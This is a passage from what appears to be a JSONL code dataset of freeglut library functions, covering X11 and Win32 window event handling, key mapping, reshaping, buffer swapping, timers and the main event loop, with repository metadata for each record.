GLUT_KEY_F6;     break;\n                    case XK_F7:     special = GLUT_KEY_F7;     break;\n                    case XK_F8:     special = GLUT_KEY_F8;     break;\n                    case XK_F9:     special = GLUT_KEY_F9;     break;\n                    case XK_F10:    special = GLUT_KEY_F10;    break;\n                    case XK_F11:    special = GLUT_KEY_F11;    break;\n                    case XK_F12:    special = GLUT_KEY_F12;    break;\n\n                    case XK_KP_Left:\n                    case XK_Left:   special = GLUT_KEY_LEFT;   break;\n                    case XK_KP_Right:\n                    case XK_Right:  special = GLUT_KEY_RIGHT;  break;\n                    case XK_KP_Up:\n                    case XK_Up:     special = GLUT_KEY_UP;     break;\n                    case XK_KP_Down:\n                    case XK_Down:   special = GLUT_KEY_DOWN;   break;\n\n                    case XK_KP_Prior:\n                    case XK_Prior:  special = GLUT_KEY_PAGE_UP; break;\n                    case XK_KP_Next:\n                    case XK_Next:   special = GLUT_KEY_PAGE_DOWN; break;\n                    case XK_KP_Home:\n                    case XK_Home:   special = GLUT_KEY_HOME;   break;\n                    case XK_KP_End:\n                    case XK_End:    special = GLUT_KEY_END;    break;\n                    case XK_KP_Insert:\n                    case XK_Insert: special = GLUT_KEY_INSERT; break;\n\n                    case XK_Num_Lock :  special = GLUT_KEY_NUM_LOCK;  break;\n                    case XK_KP_Begin :  special = GLUT_KEY_BEGIN;     break;\n                    case XK_KP_Delete:  special = GLUT_KEY_DELETE;    break;\n\n                    case XK_Shift_L:   special = GLUT_KEY_SHIFT_L;    break;\n                    case XK_Shift_R:   special = GLUT_KEY_SHIFT_R;    break;\n                    case XK_Control_L: special = GLUT_KEY_CTRL_L;     break;\n                    case XK_Control_R: special = GLUT_KEY_CTRL_R;     break;\n                    case XK_Alt_L:     special = GLUT_KEY_ALT_L;      break;\n                    case XK_Alt_R:     special = GLUT_KEY_ALT_R;      break;\n                    }\n\n                    /*\n                     * Execute the callback (if one has been specified),\n                     * given that the special code seems to be valid...\n                     */\n                    if( special_cb && (special != -1) )\n                    {\n                        fgSetWindow( window );\n                        fgState.Modifiers = fghGetXModifiers( event.xkey.state );\n                        special_cb( special, event.xkey.x, event.xkey.y );\n                        fgState.Modifiers = INVALID_MODIFIERS;\n                    }\n                }\n            }\n        }\n        break;\n\n        case ReparentNotify:\n            break; /* XXX Should disable this event */\n\n        /* Not handled */\n        case GravityNotify:\n            break;\n\n        default:\n            /* enter handling of Extension Events here */\n            #ifdef HAVE_X11_EXTENSIONS_XINPUT2_H\n                fgHandleExtensionEvents( &event );\n            #endif\n            break;\n        }\n    }\n\n#elif TARGET_HOST_MS_WINDOWS\n\n    MSG stMsg;\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutMainLoopEvent\" );\n\n    while( PeekMessage( &stMsg, NULL, 0, 0, PM_NOREMOVE ) )\n    {\n        if( GetMessage( &stMsg, NULL, 0, 0 ) == 0 )\n        {\n            if( fgState.ActionOnWindowClose == GLUT_ACTION_EXIT )\n            {\n                fgDeinitialize( );\n                exit( 0 );\n            }\n            else if( fgState.ActionOnWindowClose == GLUT_ACTION_GLUTMAINLOOP_RETURNS )\n                fgState.ExecState = GLUT_EXEC_STATE_STOP;\n\n            return;\n        }\n\n        TranslateMessage( &stMsg );\n        DispatchMessage( &stMsg );\n    }\n#endif\n\n    if( fgState.Timers.First )\n        fghCheckTimers( );\n    fghCheckJoystickPolls( );\n    fghDisplayAll( );\n\n    fgCloseWindows( );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * A static helper function to execute display callback for a window\n */\n", "func_signal": "static void fghcbDisplayWindow( SFG_Window *window,\n                                SFG_Enumerator *enumerator )", "code": "{\n    if( window->State.Redisplay &&\n        window->State.Visible )\n    {\n        window->State.Redisplay = GL_FALSE;\n\n#if TARGET_HOST_POSIX_X11\n        fghRedrawWindow ( window ) ;\n#elif TARGET_HOST_MS_WINDOWS\n\n        RedrawWindow(\n            window->Window.Handle, NULL, NULL,\n            RDW_NOERASE | RDW_INTERNALPAINT | RDW_INVALIDATE | RDW_UPDATENOW\n        );\n#endif\n    }\n\n    fgEnumSubWindows( window, fghcbDisplayWindow, enumerator );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Handle a window configuration change. When no reshape\n * callback is hooked, the viewport size is updated to\n * match the new window size.\n */\n", "func_signal": "static void fghReshapeWindow ( SFG_Window *window, int width, int height )", "code": "{\n    SFG_Window *current_window = fgStructure.CurrentWindow;\n\n    freeglut_return_if_fail( window != NULL );\n\n#if TARGET_HOST_POSIX_X11\n\n    XResizeWindow( fgDisplay.Display, window->Window.Handle,\n                   width, height );\n    XFlush( fgDisplay.Display ); /* XXX Shouldn't need this */\n\n#elif TARGET_HOST_MS_WINDOWS && !defined(_WIN32_WCE)\n    {\n        RECT windowRect;\n\n        /*\n         * For windowed mode, get the current position of the\n         * window and resize taking the size of the frame\n         * decorations into account.\n         */\n\n        /* \"GetWindowRect\" returns the pixel coordinates of the outside of the window */\n        GetWindowRect( window->Window.Handle, &windowRect );\n\n        /* Create rect in FreeGLUT format, (X,Y) topleft outside window, WxH of client area */\n        windowRect.right    = windowRect.left+width;\n        windowRect.bottom   = windowRect.top+height;\n\n        if (window->Parent == NULL)\n            /* get the window rect from this to feed to SetWindowPos, correct for window decorations */\n            fghComputeWindowRectFromClientArea_QueryWindow(window,&windowRect,TRUE);\n        else\n        {\n            /* correct rect for position client area of parent window\n             * (SetWindowPos input for child windows is in coordinates\n             * relative to the parent's client area).\n             * Child windows don't have decoration, so no need to correct\n             * for them.\n             */\n            RECT parentRect;\n            parentRect = fghGetClientArea( window->Parent, FALSE );\n            windowRect.left   -= parentRect.left;\n            windowRect.right  -= parentRect.left;\n            windowRect.top    -= parentRect.top;\n            windowRect.bottom -= parentRect.top;\n        }\n        \n        /* Do the actual resizing */\n        SetWindowPos( window->Window.Handle,\n                      HWND_TOP,\n                      windowRect.left, windowRect.top,\n                      windowRect.right - windowRect.left,\n                      windowRect.bottom- windowRect.top,\n                      SWP_NOACTIVATE | SWP_NOOWNERZORDER | SWP_NOSENDCHANGING |\n                      SWP_NOZORDER\n        );\n    }\n#endif\n\n    if( FETCH_WCB( *window, Reshape ) )\n        INVOKE_WCB( *window, Reshape, ( width, height ) );\n    else\n    {\n        fgSetWindow( window );\n        glViewport( 0, 0, width, height );\n    }\n\n    /*\n     * Force a window redraw.  In Windows at least this is only a partial\n     * solution:  if the window is increasing in size in either dimension,\n     * the already-drawn part does not get drawn again and things look funny.\n     * But without this we get this bad behaviour whenever we resize the\n     * window.\n     */\n    window->State.Redisplay = GL_TRUE;\n\n    if( window->IsMenu )\n        fgSetWindow( current_window );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Swaps the buffers for the current window (if any)\n */\n", "func_signal": "void FGAPIENTRY glutSwapBuffers( void )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutSwapBuffers\" );\n    FREEGLUT_EXIT_IF_NO_WINDOW ( \"glutSwapBuffers\" );\n\n    /*\n     * \"glXSwapBuffers\" already performs an implicit call to \"glFlush\". What\n     * about \"SwapBuffers\"?\n     */\n/*    glFlush( );*/\n    if( ! fgStructure.CurrentWindow->Window.DoubleBuffered )\n        return;\n\n#if TARGET_HOST_POSIX_X11\n    glXSwapBuffers( fgDisplay.Display, fgStructure.CurrentWindow->Window.Handle );\n#elif TARGET_HOST_MS_WINDOWS\n    SwapBuffers( fgStructure.CurrentWindow->Window.Device );\n#endif\n\n    /* GLUT_FPS env var support */\n    if( fgState.FPSInterval )\n    {\n        GLint t = glutGet( GLUT_ELAPSED_TIME );\n        fgState.SwapCount++;\n        if( fgState.SwapTime == 0 )\n            fgState.SwapTime = t;\n        else if( t - fgState.SwapTime > fgState.FPSInterval )\n        {\n            float time = 0.001f * ( t - fgState.SwapTime );\n            float fps = ( float )fgState.SwapCount / time;\n            fprintf( stderr,\n                     \"freeglut: %d frames in %.2f seconds = %.2f FPS\\n\",\n                     fgState.SwapCount, time, fps );\n            fgState.SwapTime = t;\n            fgState.SwapCount = 0;\n        }\n    }\n}", "path": "src\\freeglut\\freeglut_display.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Determine a GLUT modifer mask based on MS-WINDOWS system info.\n */\n", "func_signal": "static int fghGetWin32Modifiers (void)", "code": "{\n    return\n        ( ( ( GetKeyState( VK_LSHIFT   ) < 0 ) ||\n            ( GetKeyState( VK_RSHIFT   ) < 0 )) ? GLUT_ACTIVE_SHIFT : 0 ) |\n        ( ( ( GetKeyState( VK_LCONTROL ) < 0 ) ||\n            ( GetKeyState( VK_RCONTROL ) < 0 )) ? GLUT_ACTIVE_CTRL  : 0 ) |\n        ( ( ( GetKeyState( VK_LMENU    ) < 0 ) ||\n            ( GetKeyState( VK_RMENU    ) < 0 )) ? GLUT_ACTIVE_ALT   : 0 );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Enters the freeglut processing loop.\n * Stays until the \"ExecState\" changes to \"GLUT_EXEC_STATE_STOP\".\n */\n", "func_signal": "void FGAPIENTRY glutMainLoop( void )", "code": "{\n    int action;\n\n#if TARGET_HOST_MS_WINDOWS\n    SFG_Window *window = (SFG_Window *)fgStructure.Windows.First ;\n#endif\n\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutMainLoop\" );\n\n#if TARGET_HOST_MS_WINDOWS\n    /*\n     * Processing before the main loop:  If there is a window which is open and\n     * which has a visibility callback, call it.  I know this is an ugly hack,\n     * but I'm not sure what else to do about it.  Ideally we should leave\n     * something uninitialized in the create window code and initialize it in\n     * the main loop, and have that initialization create a \"WM_ACTIVATE\"\n     * message.  Then we would put the visibility callback code in the\n     * \"case WM_ACTIVATE\" block below.         - John Fay -- 10/24/02\n     */\n    while( window )\n    {\n        if ( FETCH_WCB( *window, Visibility ) )\n        {\n            SFG_Window *current_window = fgStructure.CurrentWindow ;\n\n            INVOKE_WCB( *window, Visibility, ( window->State.Visible ) );\n            fgSetWindow( current_window );\n        }\n\n        window = (SFG_Window *)window->Node.Next ;\n    }\n#endif\n\n    fgState.ExecState = GLUT_EXEC_STATE_RUNNING ;\n    while( fgState.ExecState == GLUT_EXEC_STATE_RUNNING )\n    {\n        SFG_Window *window;\n\n        glutMainLoopEvent( );\n        /*\n         * Step through the list of windows, seeing if there are any\n         * that are not menus\n         */\n        for( window = ( SFG_Window * )fgStructure.Windows.First;\n             window;\n             window = ( SFG_Window * )window->Node.Next )\n            if ( ! ( window->IsMenu ) )\n                break;\n\n        if( ! window )\n            fgState.ExecState = GLUT_EXEC_STATE_STOP;\n        else\n        {\n            if( fgState.IdleCallback )\n            {\n                if( fgStructure.CurrentWindow &&\n                    fgStructure.CurrentWindow->IsMenu )\n                    /* fail safe */\n                    fgSetWindow( window );\n                fgState.IdleCallback( );\n            }\n\n            fghSleepForEvents( );\n        }\n    }\n\n    /*\n     * When this loop terminates, destroy the display, state and structure\n     * of a freeglut session, so that another glutInit() call can happen\n     *\n     * Save the \"ActionOnWindowClose\" because \"fgDeinitialize\" resets it.\n     */\n    action = fgState.ActionOnWindowClose;\n    fgDeinitialize( );\n    if( action == GLUT_ACTION_EXIT )\n        exit( 0 );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Check the global timers\n */\n", "func_signal": "static void fghCheckTimers( void )", "code": "{\n    long checkTime = fgElapsedTime( );\n\n    while( fgState.Timers.First )\n    {\n        SFG_Timer *timer = fgState.Timers.First;\n\n        if( timer->TriggerTime > checkTime )\n            break;\n\n        fgListRemove( &fgState.Timers, &timer->Node );\n        fgListAppend( &fgState.FreeTimers, &timer->Node );\n\n        timer->Callback( timer->ID );\n    }\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Leaves the freeglut processing loop.\n */\n", "func_signal": "void FGAPIENTRY glutLeaveMainLoop( void )", "code": "{\n    FREEGLUT_EXIT_IF_NOT_INITIALISED ( \"glutLeaveMainLoop\" );\n    fgState.ExecState = GLUT_EXEC_STATE_STOP ;\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Window enumerator callback to check for the joystick polling code\n */\n", "func_signal": "static void fghcbCheckJoystickPolls( SFG_Window *window,\n                                     SFG_Enumerator *enumerator )", "code": "{\n    long int checkTime = fgElapsedTime( );\n\n    if( window->State.JoystickLastPoll + window->State.JoystickPollRate <=\n        checkTime )\n    {\n#if !defined(_WIN32_WCE)\n        fgJoystickPollWindow( window );\n#endif /* !defined(_WIN32_WCE) */\n        window->State.JoystickLastPoll = checkTime;\n    }\n\n    fgEnumSubWindows( window, fghcbCheckJoystickPolls, enumerator );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Does the magic required to relinquish the CPU until something interesting\n * happens.\n */\n", "func_signal": "static void fghSleepForEvents( void )", "code": "{\n    long msec;\n\n    if( fgState.IdleCallback || fghHavePendingRedisplays( ) )\n        return;\n\n    msec = fghNextTimer( );\n    /* XXX Use GLUT timers for joysticks... */\n    /* XXX Dumb; forces granularity to .01sec */\n    if( fghHaveJoystick( ) && ( msec > 10 ) )     \n        msec = 10;\n\n#if TARGET_HOST_POSIX_X11\n    /*\n     * Possibly due to aggressive use of XFlush() and friends,\n     * it is possible to have our socket drained but still have\n     * unprocessed events.  (Or, this may just be normal with\n     * X, anyway?)  We do non-trivial processing of X events\n     * after the event-reading loop, in any case, so we\n     * need to allow that we may have an empty socket but non-\n     * empty event queue.\n     */\n    if( ! XPending( fgDisplay.Display ) )\n    {\n        fd_set fdset;\n        int err;\n        int socket;\n        struct timeval wait;\n\n        socket = ConnectionNumber( fgDisplay.Display );\n        FD_ZERO( &fdset );\n        FD_SET( socket, &fdset );\n        wait.tv_sec = msec / 1000;\n        wait.tv_usec = (msec % 1000) * 1000;\n        err = select( socket+1, &fdset, NULL, NULL, &wait );\n\n#ifdef HAVE_ERRNO_H\n        if( ( -1 == err ) && ( errno != EINTR ) )\n            fgWarning ( \"freeglut select() error: %d\", errno );\n#endif\n    }\n#elif TARGET_HOST_MS_WINDOWS\n    MsgWaitForMultipleObjects( 0, NULL, FALSE, msec, QS_ALLINPUT );\n#endif\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Check all windows for joystick polling\n */\n", "func_signal": "static void fghCheckJoystickPolls( void )", "code": "{\n    SFG_Enumerator enumerator;\n\n    enumerator.found = GL_FALSE;\n    enumerator.data  =  NULL;\n\n    fgEnumWindows( fghcbCheckJoystickPolls, &enumerator );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Returns GLUT modifier mask for the state field of an X11 event.\n */\n", "func_signal": "int fghGetXModifiers( int state )", "code": "{\n    int ret = 0;\n\n    if( state & ( ShiftMask | LockMask ) )\n        ret |= GLUT_ACTIVE_SHIFT;\n    if( state & ControlMask )\n        ret |= GLUT_ACTIVE_CTRL;\n    if( state & Mod1Mask )\n        ret |= GLUT_ACTIVE_ALT;\n\n    return ret;\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * Make all windows perform a display call\n */\n", "func_signal": "static void fghDisplayAll( void )", "code": "{\n    SFG_Enumerator enumerator;\n\n    enumerator.found = GL_FALSE;\n    enumerator.data  =  NULL;\n\n    fgEnumWindows( fghcbDisplayWindow, &enumerator );\n}", "path": "src\\freeglut\\freeglut_main.c", "repo_name": "jdupuy/ssgi", "stars": 47, "license": "None", "language": "c", "size": 700}
{"docstring": "/*\n * The window procedure for handling Win32 events\n */\n", "func_signal": "LRESULT CALLBACK fgWindowProc( HWND hWnd, UINT uMsg, WPARAM wParam,\n                               LPARAM lParam )", "code": "{\n    static unsigned char lControl = 0, rControl = 0, lShift = 0,\n                         rShift = 0, lAlt = 0, rAlt = 0;\n\n    SFG_Window* window;\n    PAINTSTRUCT ps;\n    LRESULT lRet = 1;\n\n    FREEGLUT_INTERNAL_ERROR_EXIT_IF_NOT_INITIALISED ( \"Event Handler\" ) ;\n\n    window = fgWindowByHandle( hWnd );\n\n    if ( ( window == NULL ) && ( uMsg != WM_CREATE ) )\n      return DefWindowProc( hWnd, uMsg, wParam, lParam );\n\n    /* printf ( \"Window %3d message <%04x> %12d %12d\\n\", window?window->ID:0,\n             uMsg, wParam, lParam ); */\n\n    if ( window )\n    {\n      /* Checking for CTRL, ALT, and SHIFT key positions:  Key Down! */\n      if ( !lControl && GetAsyncKeyState ( VK_LCONTROL ) )\n      {\n          INVOKE_WCB\t( *window, Special,\n                        ( GLUT_KEY_CTRL_L, window->State.MouseX, window->State.MouseY )\n                      );\n\n          lControl = 1;\n      }\n\n      if ( !rControl && GetAsyncKeyState ( VK_RCONTROL ) )\n      {\n          INVOKE_WCB ( *window, Special,\n                       ( GLUT_KEY_CTRL_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rControl = 1;\n      }\n\n      if ( !lShift && GetAsyncKeyState ( VK_LSHIFT ) )\n      {\n          INVOKE_WCB ( *window, Special,\n                       ( GLUT_KEY_SHIFT_L, window->State.MouseX, window->State.MouseY )\n                     );\n\n          lShift = 1;\n      }\n\n      if ( !rShift && GetAsyncKeyState ( VK_RSHIFT ) )\n      {\n          INVOKE_WCB ( *window, Special,\n                       ( GLUT_KEY_SHIFT_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rShift = 1;\n      }\n\n      if ( !lAlt && GetAsyncKeyState ( VK_LMENU ) )\n      {\n          INVOKE_WCB ( *window, Special,\n                       ( GLUT_KEY_ALT_L, window->State.MouseX, window->State.MouseY )\n                     );\n\n          lAlt = 1;\n      }\n\n      if ( !rAlt && GetAsyncKeyState ( VK_RMENU ) )\n      {\n          INVOKE_WCB ( *window, Special,\n                       ( GLUT_KEY_ALT_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rAlt = 1;\n      }\n\n      /* Checking for CTRL, ALT, and SHIFT key positions:  Key Up! */\n      if ( lControl && !GetAsyncKeyState ( VK_LCONTROL ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_CTRL_L, window->State.MouseX, window->State.MouseY )\n                     );\n\n          lControl = 0;\n      }\n\n      if ( rControl && !GetAsyncKeyState ( VK_RCONTROL ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_CTRL_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rControl = 0;\n      }\n\n      if ( lShift && !GetAsyncKeyState ( VK_LSHIFT ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_SHIFT_L, window->State.MouseX, window->State.MouseY )\n                     );\n\n          lShift = 0;\n      }\n\n      if ( rShift && !GetAsyncKeyState ( VK_RSHIFT ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_SHIFT_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rShift = 0;\n      }\n\n      if ( lAlt && !GetAsyncKeyState ( VK_LMENU ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_ALT_L, window->State.MouseX, window->State.MouseY )\n                     );\n\n          lAlt = 0;\n      }\n\n      if ( rAlt && !GetAsyncKeyState ( VK_RMENU ) )\n      {\n          INVOKE_WCB ( *window, SpecialUp,\n                       ( GLUT_KEY_ALT_R, window->State.MouseX, window->State.MouseY )\n                     );\n\n          rAlt = 0;\n      }\n    }\n\n    switch( uMsg )\n    {\n    case WM_CREATE:\n        /* The window structure is passed as the creation structure parameter... */\n        window = (SFG_Window *) (((LPCREATESTRUCT) lParam)->lpCreateParams);\n        FREEGLUT_INTERNAL_ERROR_EXIT ( ( window != NULL ), \"Cannot create window\",\n                                       \"fgWindowProc\" );\n\n        window->Window.Handle = hWnd;\n        window->Window.Device = GetDC( hWnd );\n        if( window->IsMenu )\n        {\n            unsigned int current_DisplayMode = fgState.DisplayMode;\n            fgState.DisplayMode = GLUT_DOUBLE | GLUT_RGB | GLUT_DEPTH;\n#if !defined(_WIN32_WCE)\n            fgSetupPixelFormat( window, GL_FALSE, PFD_MAIN_PLANE );\n#endif\n            fgState.DisplayMode = current_DisplayMode;\n\n            if( fgStructure.MenuContext )\n                wglMakeCurrent( window->Window.Device,\n                                fgStructure.MenuContext->MContext\n                );\n            else\n            {\n                fgStructure.MenuContext =\n                    (SFG_MenuContext *)malloc( sizeof(SFG_MenuContext) );\n                fgStructure.MenuContext->MContext =\n                    wglCreateContext( window->Window.Device );\n            }\n\n            /* window->Window.Context = wglGetCurrentContext ();   */\n            window->Window.Context = wglCreateContext( window->Window.Device );\n        }\n        else\n        {\n#if !defined(_WIN32_WCE)\n            fgSetupPixelFormat( window, GL_FALSE, PFD_MAIN_PLANE );\n#endif\n\n            if( ! fgState.UseCurrentContext )\n                window->Window.Context =\n                    wglCreateContext( window->Window.Device );\n            else\n            {\n                window->Window.Context = wglGetCurrentContext( );\n                if( ! window->Window.Context )\n                    window->Window.Context =\n                        wglCreateContext( window->Window.Device );\n            }\n\n#if !defined(_WIN32_WCE)\n            fgNewWGLCreateContext( window );\n#endif\n        }\n\n        window->State.NeedToResize = GL_TRUE;\n        /* if we used CW_USEDEFAULT (thats a negative value) for the size\n         * of the window, query the window now for the size at which it\n         * was created.\n         */\n        if( ( window->State.Width < 0 ) || ( window->State.Height < 0 ) )\n        {\n            SFG_Window *current_window = fgStructure.CurrentWindow;\n\n            fgSetWindow( window );\n            window->State.Width = glutGet( GLUT_WINDOW_WIDTH );\n            window->State.Height = glutGet( GLUT_WINDOW_HEIGHT );\n            fgSetWindow( current_window );\n        }\n\n        ReleaseDC( window->Window.Handle, window->Window.Device );\n\n#if defined(_WIN32_WCE)\n        /* Take over button handling */\n        {\n            HINSTANCE dxDllLib=LoadLibrary(_T(\"gx.dll\"));\n            if (dxDllLib)\n            {\n                GXGetDefaultKeys_=(GXGETDEFAULTKEYS)GetProcAddress(dxDllLib, _T(\"?GXGetDefaultKeys@@YA?AUGXKeyList@@H@Z\"));\n                GXOpenInput_=(GXOPENINPUT)GetProcAddress(dxDllLib, _T(\"?GXOpenInput@@YAHXZ\"));\n            }\n\n            if(GXOpenInput_)\n                (*GXOpenInput_)();\n            if(GXGetDefaultKeys_)\n                gxKeyList = (*GXGetDefaultKeys_)(GX_LANDSCAPEKEYS);\n        }\n\n#endif /* defined(_WIN32_WCE) */\n        break;\n\n    case WM_SIZE:\n        /*\n         * If the window is visible, then it is the user manually resizing it.\n         * If it is not, then it is the system sending us a dummy resize with\n         * zero dimensions on a \"glutIconifyWindow\" call.\n         */\n        if( window->State.Visible )\n        {\n            window->State.NeedToResize = GL_TRUE;\n#if defined(_WIN32_WCE)\n            window->State.Width  = HIWORD(lParam);\n            window->State.Height = LOWORD(lParam);\n#else\n            window->State.Width  = LOWORD(lParam);\n            window->State.Height = HIWORD(lParam);\n#endif /* defined(_WIN32_WCE) */\n        }\n\n        break;\n\n    case WM_SETFOCUS:\n/*        printf(\"WM_SETFOCUS: %p\\n\", window ); */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        INVOKE_WCB( *window, Entry, ( GLUT_ENTERED ) );\n        break;\n\n    case WM_KILLFOCUS:\n/*        printf(\"WM_KILLFOCUS: %p\\n\", window ); */\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        INVOKE_WCB( *window, Entry, ( GLUT_LEFT ) );\n\n        if( window->IsMenu &&\n            window->ActiveMenu && window->ActiveMenu->IsActive )\n            fgUpdateMenuHighlight( window->ActiveMenu );\n\n        break;\n\n#if 0\n    case WM_ACTIVATE:\n        if (LOWORD(wParam) != WA_INACTIVE)\n        {\n/*            printf(\"WM_ACTIVATE: fgSetCursor( %p, %d)\\n\", window,\n                   window->State.Cursor ); */\n            fgSetCursor( window, window->State.Cursor );\n        }\n\n        lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n#endif\n\n    case WM_SETCURSOR:\n/*      printf ( \"Cursor event %x %x %x %x\\n\", window, window->State.Cursor, lParam, wParam ) ; */\n        if( LOWORD( lParam ) == HTCLIENT )\n            fgSetCursor ( window, window->State.Cursor ) ;\n        else\n            lRet = DefWindowProc( hWnd, uMsg, wParam, lParam );\n        break;\n\n    case WM_SHOWWINDOW:\n        window->State.Visible = GL_TRUE;\n        window->State.Redisplay = GL_TRUE;\n        break;\n\n    case WM_PAINT:\n        /* Turn on the visibility in case it was turned off somehow */\n        window->State.Visible = GL_TRUE;\n        BeginPaint( hWnd, &ps );\n        fghRedrawWindow( window );\n        EndPaint( hWnd, &ps );\n        break;\n\n    case WM_CLOSE:\n        fgDestroyWindow ( window );\n        if ( fgState.ActionOnWindowClose != GLUT_ACTION_CONTINUE_EXECUTION )\n            PostQuitMessage(0);\n        break;\n\n    case WM_DESTROY:\n        /*\n         * The window already got destroyed, so don't bother with it.\n         */\n        return 0;\n\n    case WM_MOUSEMOVE:\n    {\n#if defined(_WIN32_WCE)\n        window->State.MouseX = 320-HIWORD( lParam );\n        window->State.MouseY = LOWORD( lParam );\n#else\n        window->State.MouseX = LOWORD( lParam );\n        window->State.MouseY = HIWORD( lParam );\n#endif /* defined(_WIN32_WCE) */\n        /* Restrict to [-32768, 32767] to match X11 behaviour       */\n        /* See comment in \"freeglut_developer\" mailing list 10/4/04 */\n        if ( window->State.MouseX > 32767 ) window->State.MouseX -= 65536;\n        if ( window->State.MouseY > 32767 ) window->State.MouseY -= 65536;\n\n        if ( window->ActiveMenu )\n        {\n            fgUpdateMenuHighlight( window->ActiveMenu );\n            break;\n        }\n        SetFocus(window->Window.Handle);\n\n        fgState.Modifiers = fghGetWin32Modifiers( );\n\n        if( ( wParam & MK_LBUTTON ) ||\n            ( wParam & MK_MBUTTON ) ||\n            ( wParam & MK_RBUTTON ) )\n            INVOKE_WCB( *window, Motion, ( window->State.MouseX,\n                                           window->State.MouseY ) );\n        else\n            INVOKE_WCB( *window, Passive, ( window->State.MouseX,\n                                            window->State.MouseY ) );\n\n        fgState.Modifiers = INVALID_MODIFIERS;\n    }\n    break;\n\n    case WM_LBUTTONDOWN:\n    case WM_MBUTTONDOWN:\n    case WM_RBUTTONDOWN:\n    case WM_LBUTTONUP:\n    case WM_MBUTTONUP:\n    case WM_RBUTTONUP:\n    {\n        GLboolean pressed = GL_TRUE;\n        int button;\n\n#if defined(_WIN32_WCE)\n        window->State.MouseX = 320-HIWORD( lParam );\n        window->State.MouseY = LOWORD( lParam );\n#else\n        window->State.MouseX = LOWORD( lParam );\n        window->State.MouseY = HIWORD( lParam );\n#endif /* defined(_WIN32_WCE) */\n\n        /* Restrict to [-32768, 32767] to match X11 behaviour       */\n        /* See comment in \"freeglut_developer\" mailing list 10/4/04 */\n        if ( window->State.MouseX > 32767 ) window->State.MouseX -= 65536;\n        if ( window->State.MouseY > 32767 ) window->State.MouseY -= 65536;\n\n        switch( uMsg )\n        {\n        case WM_LBUTTONDOWN:\n            pressed = GL_TRUE;\n            button = GLUT_LEFT_BUTTON;\n            break;\n        case WM_MBUTTONDOWN:\n            pressed = GL_TRUE;\n            button = GLUT_MIDDLE_BUTTON;\n            break;\n        case WM_RBUTTONDOWN:\n            pressed = GL_TRUE;\n            button = GLUT_RIGHT_BUTTON;\n            break;\n        case WM_LBUTTONUP:\n            pressed = GL_FALSE;\n            button = GLUT_LEFT_BUTTON;\n            break;\n        case WM_MBUTTONUP:\n            pressed = GL_FALSE;\n            button = GLUT_MIDDLE_BUTTON;\n            break;\n        case WM_RBUTTONUP:\n            pressed = GL_FALSE;\n            button = GLUT_RIGHT_BUTTON;\n            break;\n        default:\n            pressed = GL_FALSE;\n            button = -1;\n            break;\n        }\n\n#if !defined(_WIN32_WCE)\n        if( GetSystemMetrics( SM_SWAPBUTTON ) )\n        {\n            if( button == GLUT_LEFT_BUTTON )\n                button = GLUT_RIGHT_BUTTON;\n            else\n                if( button == GLUT_RIGHT_BUTTON )\n                    button = GLUT_LEFT_BUTTON;\n        }\n#endif /* !defined(_WIN32_WCE) */\n\n        if( button == -1 )\n            return DefWindowProc( hWnd, uMsg, lParam, wParam );\n\n        /*\n         * Do not execute the application's mouse callback if a menu\n         * is hooked to this button.  In that case an appropriate\n         * private call should be generated.\n         */\n        if( fgCheckActiveMenu( window, button, pressed,\n                               window->State.MouseX, window->State.MouseY ) )\n            break;\n\n        /* Set capture so that the window captures all the mouse messages */\n        /*\n         * XXX - Multiple button support:  Under X11, the mouse is not released\n         * XXX - from the window until all buttons have been released, even if the\n         * XXX - user presses a button in another window.  This will take more\n         * XXX - code changes than I am up to at the moment (10/5/04).  The present\n         * XXX - is a 90 percent solution.\n         */\n        if ( pressed == GL_TRUE )\n          SetCapture ( window->Window.Handle ) ;\n        else\n          